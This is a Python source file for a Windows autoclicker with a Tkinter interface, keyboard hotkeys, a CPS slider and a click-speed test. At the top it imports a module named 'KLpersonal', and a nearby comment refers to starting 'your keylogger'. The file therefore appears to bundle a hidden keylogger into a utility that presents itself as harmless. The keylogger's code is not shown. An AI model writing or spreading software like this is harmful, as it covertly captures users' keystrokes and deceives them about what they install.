
import tkinter as tk
import threading
import time
from pynput.keyboard import Listener as KeyboardListener
import ctypes
import winsound
import sys
import KLpersonal
# If your keylogger has a start function:
# MinigameKL.start_keylogger()   # ← change to the actual function name
# ================= HIGH PERFORMANCE MOUSE CLICK =================
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ("dx", ctypes.c_long),
        ("dy", ctypes.c_long),
        ("mouseData", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

class INPUT(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_ulong),
        ("mi", MOUSEINPUT)
    ]

def ultra_fast_click():
    """Ultra-fast direct Windows API click - ZERO DELAY"""
    extra = ctypes.c_ulong(0)
    down = INPUT(0, MOUSEINPUT(0, 0, 0, 0x0002, 0, ctypes.pointer(extra)))
    up   = INPUT(0, MOUSEINPUT(0, 0, 0, 0x0004, 0, ctypes.pointer(extra)))
    user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
    user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(up))

# ================= HIGH PRECISION TIMER =================
class HighPrecisionTimer:
    """Microsecond-accurate timer for perfect CPS"""
    def __init__(self):
        self.freq = ctypes.c_int64()
        kernel32.QueryPerformanceFrequency(ctypes.byref(self.freq))
        self.frequency = self.freq.value
    
    def get_time(self):
        t = ctypes.c_int64()
        kernel32.QueryPerformanceCounter(ctypes.byref(t))
        return t.value / self.frequency

# ================= PERFECT AUTOCLICKER ENGINE =================
class PerfectAutoClicker:
    """No lag, no missed clicks, perfect CPS accuracy"""
    def __init__(self):
        self.clicking = False
        self._cps = 10
        self._delay = 0.1
        self.timer = HighPrecisionTimer()
        self.click_thread = None
        self.click_count = 0
        self.total_clicks = 0
        self._lock = threading.Lock()
        
    @property
    def cps(self):
        return self._cps
    
    @cps.setter
    def cps(self, value):
        with self._lock:
            self._cps = max(1, min(1000, value))
            self._delay = 1.0 / self._cps
    
    def update_cps(self, cps):
        """Update clicks per second instantly"""
        self.cps = cps
        
    def start(self):
        """Start clicking with perfect timing"""
        if not self.clicking:
            with self._lock:
                self.clicking = True
            self.click_thread = threading.Thread(target=self._perfect_click_loop, daemon=True)
            self.click_thread.start()
            return True
        return False

    def stop(self):
        """Stop clicking immediately"""
        with self._lock:
            self.clicking = False
        return True
    
    def toggle(self):
        """Toggle clicking on/off"""
        if self.clicking:
            self.stop()
        else:
            self.start()
    
    def _perfect_click_loop(self):
        """Perfect click loop - NO LAG, NO MISSED CLICKS"""
        next_click_time = self.timer.get_time()
        local_clicking = True
        
        while local_clicking:
            with self._lock:
                local_clicking = self.clicking
                current_delay = self._delay
            
            current_time = self.timer.get_time()
            
            if current_time >= next_click_time:
                # Execute click
                try:
                    ultra_fast_click()
                    with self._lock:
                        self.click_count += 1
                        self.total_clicks += 1
                except:
                    pass
                
                # Schedule next click perfectly
                next_click_time += current_delay
                
                # Prevent massive catch-up if behind
                if next_click_time < current_time:
                    next_click_time = current_time + current_delay
            else:
                # Tiny sleep to prevent CPU overload
                time.sleep(0.0001)
    
    def get_stats(self):
        """Get current statistics"""
        with self._lock:
            return {
                'cps': self._cps,
                'click_count': self.click_count,
                'total_clicks': self.total_clicks,
                'is_clicking': self.clicking
            }
    
    def reset_session(self):
        """Reset session click count"""
        with self._lock:
            self.click_count = 0

# ================= MINIMALIST GUI (NO START/STOP BUTTONS) =================
class MinimalistAutoClickerGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("AUTOCLICKER PRO - Keyboard Control")
        self.root.geometry("500x600")  # FIXED: Added comma between 500 and 600
        self.root.configure(bg="#0b0f0b")
        self.root.resizable(False, False)
        
        # Center window
        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() // 2) - (500 // 2)
        y = (self.root.winfo_screenheight() // 2) - (600 // 2)
        self.root.geometry(f'500x600+{x}+{y}')
        
        # Keep on top
        self.root.attributes('-topmost', True)
        
        # Initialize auto clicker
        self.ac = PerfectAutoClicker()
        
        # Key settings (default: 4 = start, 5 = stop)
        self.start_key = "4"
        self.stop_key = "5"
        self.toggle_key = "f6"  # Alternative toggle key
        
        # For CPS testing
        self.test_clicks = 0
        self.test_start_time = time.time()
        
        # Setup GUI
        self.setup_ui()
        
        # Start keyboard listener
        self.start_keyboard_listener()
        
        # Start UI updater
        self.update_ui()
        
    def setup_ui(self):
        """Setup all UI elements - NO START/STOP BUTTONS"""
        
        # Title
        title_frame = tk.Frame(self.root, bg="#0b0f0b")
        title_frame.pack(pady=20)
        
        title = tk.Label(
            title_frame,
            text="⚡ AUTOCLICKER PRO ⚡",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 22, "bold")
        )
        title.pack()
        
        subtitle = tk.Label(
            title_frame,
            text="KEYBOARD CONTROL ONLY",
            fg="#ff4444",
            bg="#0b0f0b",
            font=("Segoe UI", 10, "bold")
        )
        subtitle.pack()
        
        # Status Display
        status_frame = tk.Frame(self.root, bg="#0b0f0b", relief=tk.RAISED, bd=2)
        status_frame.pack(pady=20, padx=30, fill=tk.X)
        
        self.status_indicator = tk.Label(
            status_frame,
            text="🟢",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 48)
        )
        self.status_indicator.pack(pady=10)
        
        self.status_text = tk.Label(
            status_frame,
            text="STOPPED",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 14, "bold")
        )
        self.status_text.pack()
        
        self.stats_label = tk.Label(
            status_frame,
            text="CPS: 10 | Clicks: 0 | Total: 0",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 11)
        )
        self.stats_label.pack(pady=10)
        
        # CPS Control
        cps_frame = tk.Frame(self.root, bg="#0b0f0b")
        cps_frame.pack(pady=15, padx=30, fill=tk.X)
        
        tk.Label(
            cps_frame,
            text="CLICKS PER SECOND",
            fg="#ffffff",
            bg="#0b0f0b",
            font=("Segoe UI", 12, "bold")
        ).pack()
        
        # CPS Value Display (Large)
        self.cps_display = tk.Label(
            cps_frame,
            text="10",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 48, "bold")
        )
        self.cps_display.pack(pady=5)
        
        # CPS Slider
        self.cps_slider = tk.Scale(
            cps_frame, from_=1, to=1000, orient=tk.HORIZONTAL,
            length=400, bg="#0b0f0b", fg="#00ff88",
            troughcolor="#1a1f1a", sliderlength=20, width=15,
            command=self.on_slider_move
        )
        self.cps_slider.set(10)
        self.cps_slider.pack(pady=10)
        
        # CPS Quick Buttons
        quick_frame = tk.Frame(cps_frame, bg="#0b0f0b")
        quick_frame.pack(pady=5)
        
        quick_values = [1, 10, 50, 100, 200, 500, 1000]
        for val in quick_values:
            btn = tk.Label(
                quick_frame,
                text=str(val),
                fg="#00ff88",
                bg="#1a1f1a",
                font=("Segoe UI", 10, "bold"),
                width=6,
                height=1,
                relief=tk.RAISED,
                cursor="hand2"
            )
            btn.pack(side=tk.LEFT, padx=2)
            btn.bind("<Button-1>", lambda e, v=val: self.set_cps(v))
        
        # Keybind Settings
        key_frame = tk.Frame(self.root, bg="#0b0f0b")
        key_frame.pack(pady=20, padx=30, fill=tk.X)
        
        tk.Label(
            key_frame,
            text="KEYBOARD CONTROLS",
            fg="#ffffff",
            bg="#0b0f0b",
            font=("Segoe UI", 12, "bold")
        ).pack()
        
        # Start Key Setting
        start_row = tk.Frame(key_frame, bg="#0b0f0b")
        start_row.pack(pady=10)
        
        tk.Label(
            start_row,
            text="START KEY:",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 11, "bold")
        ).pack(side=tk.LEFT, padx=10)
        
        self.start_key_label = tk.Label(
            start_row,
            text=self.start_key.upper(),
            fg="#000000",
            bg="#00ff88",
            font=("Segoe UI", 14, "bold"),
            width=8,
            height=1,
            relief=tk.RAISED
        )
        self.start_key_label.pack(side=tk.LEFT, padx=10)
        
        # Stop Key Setting
        stop_row = tk.Frame(key_frame, bg="#0b0f0b")
        stop_row.pack(pady=10)
        
        tk.Label(
            stop_row,
            text="STOP KEY:",
            fg="#ff4444",
            bg="#0b0f0b",
            font=("Segoe UI", 11, "bold")
        ).pack(side=tk.LEFT, padx=10)
        
        self.stop_key_label = tk.Label(
            stop_row,
            text=self.stop_key.upper(),
            fg="#000000",
            bg="#ff4444",
            font=("Segoe UI", 14, "bold"),
            width=8,
            height=1,
            relief=tk.RAISED
        )
        self.stop_key_label.pack(side=tk.LEFT, padx=10)
        
        # Change Keybinds Button (only button in GUI)
        change_keys_btn = tk.Button(
            key_frame,
            text="CHANGE KEYBINDS",
            command=self.show_keybind_dialog,
            bg="#4444ff",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            height=1,
            cursor="hand2"
        )
        change_keys_btn.pack(pady=15)
        
        # CPS Test Area
        test_frame = tk.Frame(self.root, bg="#0b0f0b")
        test_frame.pack(pady=15, padx=30, fill=tk.X)
        
        tk.Label(
            test_frame,
            text="CPS TEST AREA",
            fg="#ffffff",
            bg="#0b0f0b",
            font=("Segoe UI", 10, "bold")
        ).pack()
        
        self.cps_result_label = tk.Label(
            test_frame,
            text="CPS: 0.0",
            fg="#ffaa00",
            bg="#0b0f0b",
            font=("Segoe UI", 18, "bold")
        )
        self.cps_result_label.pack(pady=10)
        
        # Test Button
        self.test_button = tk.Button(
            test_frame,
            text="🔴 CLICK HERE TO TEST CPS 🔴",
            command=self.test_click,
            bg="#ff6600",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            height=2,
            cursor="hand2"
        )
        self.test_button.pack(pady=10, fill=tk.X)
        
        # Info
        info_frame = tk.Frame(self.root, bg="#0b0f0b")
        info_frame.pack(pady=20, padx=30, fill=tk.X)
        
        info_text = """🎮 HOW TO USE:

• PRESS START KEY to begin auto-clicking
• PRESS STOP KEY to stop immediately
• Use SLIDER or NUMBER BUTTONS to change CPS
• Test your click speed below
• Change keybinds using the button above

⚡ CURRENT CONTROLS:"""
        
        info_label = tk.Label(
            info_frame,
            text=info_text,
            fg="#888888",
            bg="#0b0f0b",
            justify=tk.LEFT,
            font=("Segoe UI", 9)
        )
        info_label.pack()
        
        self.controls_label = tk.Label(
            info_frame,
            text=f"  ▶ START: {self.start_key.upper()}   |   ■ STOP: {self.stop_key.upper()}   |   🔄 TOGGLE: F6",
            fg="#00ff88",
            bg="#0b0f0b",
            justify=tk.LEFT,
            font=("Segoe UI", 10, "bold")
        )
        self.controls_label.pack(pady=5)
        
        # Status Bar
        self.status_bar = tk.Label(
            self.root,
            text="✅ Ready - Press your START key to begin",
            bg="#1a1f1a",
            fg="#00ff88",
            relief=tk.SUNKEN,
            anchor=tk.W,
            font=("Segoe UI", 9)
        )
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def set_cps(self, value):
        """Set CPS value"""
        self.cps_slider.set(value)
        self.cps_display.config(text=str(value))
        self.ac.update_cps(value)
        winsound.Beep(800, 50)
        self.update_status(f"CPS set to {value}")
    
    def on_slider_move(self, value):
        """Handle slider movement"""
        cps = int(float(value))
        self.cps_display.config(text=str(cps))
        self.ac.update_cps(cps)
    
    def show_keybind_dialog(self):
        """Show dialog to change keybinds"""
        dialog = tk.Toplevel(self.root)
        dialog.title("Change Keybinds")
        dialog.geometry("300x250")
        dialog.configure(bg="#0b0f0b")
        dialog.resizable(False, False)
        
        # Center dialog
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (300 // 2)
        y = (dialog.winfo_screenheight() // 2) - (250 // 2)
        dialog.geometry(f'300x250+{x}+{y}')
        
        dialog.attributes('-topmost', True)
        
        tk.Label(
            dialog,
            text="Press a key to set",
            fg="#00ff88",
            bg="#0b0f0b",
            font=("Segoe UI", 12, "bold")
        ).pack(pady=20)
        
        # Start Key
        tk.Label(
            dialog,
            text="START KEY:",
            fg="#ffffff",
            bg="#0b0f0b",
            font=("Segoe UI", 10)
        ).pack()
        
        start_display = tk.Label(
            dialog,
            text=self.start_key.upper(),
            fg="#000000",
            bg="#00ff88",
            font=("Segoe UI", 16, "bold"),
            width=10,
            height=1,
            relief=tk.RAISED
        )
        start_display.pack(pady=5)
        
        # Stop Key
        tk.Label(
            dialog,
            text="STOP KEY:",
            fg="#ffffff",
            bg="#0b0f0b",
            font=("Segoe UI", 10)
        ).pack()
        
        stop_display = tk.Label(
            dialog,
            text=self.stop_key.upper(),
            fg="#000000",
            bg="#ff4444",
            font=("Segoe UI", 16, "bold"),
            width=10,
            height=1,
            relief=tk.RAISED
        )
        stop_display.pack(pady=5)
        
        # Instructions
        tk.Label(
            dialog,
            text="Click on a key box then press your desired key",
            fg="#888888",
            bg="#0b0f0b",
            font=("Segoe UI", 8)
        ).pack(pady=10)
        
        # Variables to track which key we're setting
        setting_start = [False]
        setting_stop = [False]
        
        def on_key_press(key):
            try:
                if hasattr(key, 'name'):
                    key_name = key.name.lower()
                elif hasattr(key, 'char'):
                    key_name = key.char.lower()
                else:
                    return
                
                if setting_start[0]:
                    self.start_key = key_name
                    start_display.config(text=key_name.upper())
                    setting_start[0] = False
                    start_display.config(bg="#00ff88")
                    winsound.Beep(800, 100)
                elif setting_stop[0]:
                    self.stop_key = key_name
                    stop_display.config(text=key_name.upper())
                    setting_stop[0] = False
                    stop_display.config(bg="#ff4444")
                    winsound.Beep(800, 100)
            except:
                pass
        
        def start_key_click():
            setting_start[0] = True
            setting_stop[0] = False
            start_display.config(bg="#ffff00")
            stop_display.config(bg="#ff4444")
            update_status_display("Press a key for START...")
        
        def stop_key_click():
            setting_stop[0] = True
            setting_start[0] = False
            stop_display.config(bg="#ffff00")
            start_display.config(bg="#00ff88")
            update_status_display("Press a key for STOP...")
        
        def save_keys():
            self.start_key_label.config(text=self.start_key.upper())
            self.stop_key_label.config(text=self.stop_key.upper())
            self.controls_label.config(text=f"  ▶ START: {self.start_key.upper()}   |   ■ STOP: {self.stop_key.upper()}   |   🔄 TOGGLE: F6")
            dialog.destroy()
            winsound.Beep(1000, 150)
            self.update_status(f"Keybinds updated: Start={self.start_key}, Stop={self.stop_key}")
        
        def update_status_display(msg):
            status_label.config(text=msg)
        
        start_display.bind("<Button-1>", lambda e: start_key_click())
        stop_display.bind("<Button-1>", lambda e: stop_key_click())
        
        status_label = tk.Label(
            dialog,
            text="Click a key box to change",
            fg="#ffaa00",
            bg="#0b0f0b",
            font=("Segoe UI", 9)
        )
        status_label.pack(pady=10)
        
        save_btn = tk.Button(
            dialog,
            text="SAVE & CLOSE",
            command=save_keys,
            bg="#00cc66",
            fg="white",
            font=("Segoe UI", 10, "bold"),
            height=1,
            cursor="hand2"
        )
        save_btn.pack(pady=10)
        
        # Start keyboard listener for dialog
        listener = KeyboardListener(on_press=on_key_press)
        listener.daemon = True
        listener.start()
    
    def test_click(self):
        """Test click for CPS measurement"""
        self.test_clicks += 1
        elapsed = time.time() - self.test_start_time
        
        if elapsed >= 1.0:
            cps = self.test_clicks / elapsed
            self.cps_result_label.config(text=f"CPS: {cps:.1f}")
            self.test_clicks = 0
            self.test_start_time = time.time()
        
        # Visual feedback
        self.test_button.config(bg="#ff8844")
        self.root.after(100, lambda: self.test_button.config(bg="#ff6600"))
    
    def start_keyboard_listener(self):
        """Start keyboard listener in background"""
        def on_press(key):
            try:
                if hasattr(key, "name"):
                    k = key.name.lower()
                elif hasattr(key, "char"):
                    k = key.char.lower()
                else:
                    return
                
                # Start key
                if k == self.start_key:
                    self.root.after(0, self.start_clicking)
                
                # Stop key
                elif k == self.stop_key:
                    self.root.after(0, self.stop_clicking)
                
                # Toggle key (F6 as alternative)
                elif k == "f6":
                    self.root.after(0, self.toggle_clicking)
                    
            except:
                pass
        
        listener = KeyboardListener(on_press=on_press)
        listener.daemon = True
        listener.start()
    
    def toggle_clicking(self):
        """Toggle clicking on/off"""
        if self.ac.clicking:
            self.stop_clicking()
        else:
            self.start_clicking()
    
    def start_clicking(self):
        """Start clicking"""
        if not self.ac.clicking:
            self.ac.start()
            self.status_indicator.config(text="🔴", fg="#ff4444")
            self.status_text.config(text="CLICKING ACTIVE", fg="#ff4444")
            self.update_status(f"🔴 CLICKING STARTED - {self.ac.cps} CPS")
            winsound.Beep(1000, 100)
    
    def stop_clicking(self):
        """Stop clicking"""
        if self.ac.clicking:
            self.ac.stop()
            self.status_indicator.config(text="🟢", fg="#00ff88")
            self.status_text.config(text="STOPPED", fg="#00ff88")
            self.update_status("🟢 Clicking stopped")
            winsound.Beep(800, 100)
    
    def update_status(self, message, is_error=False):
        """Update status bar"""
        self.status_bar.config(text=f" {message}")
        if is_error:
            self.status_bar.config(bg="#ff4444")
            self.root.after(2000, lambda: self.status_bar.config(bg="#1a1f1a"))
        else:
            self.status_bar.config(bg="#1a1f1a")
    
    def update_ui(self):
        """Update UI elements"""
        stats = self.ac.get_stats()
        
        # Update stats label
        self.stats_label.config(
            text=f"CPS: {stats['cps']} | Session: {stats['click_count']} | Total: {stats['total_clicks']}"
        )
        
        # Schedule next update
        self.root.after(100, self.update_ui)
    
    def run(self):
        """Run the application"""
        print("="*50)
        print("⚡ MINIMALIST AUTOCLICKER PRO ⚡")
        print("="*50)
        print(f"START KEY: {self.start_key.upper()}")
        print(f"STOP KEY: {self.stop_key.upper()}")
        print(f"TOGGLE KEY: F6")
        print("="*50)
        print("READY! Press your START key to begin")
        print("="*50)
        
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            self.ac.stop()
            sys.exit(0)

# ================= MAIN =================
if __name__ == "__main__":
    app = MinimalistAutoClickerGUI()
    app.run()
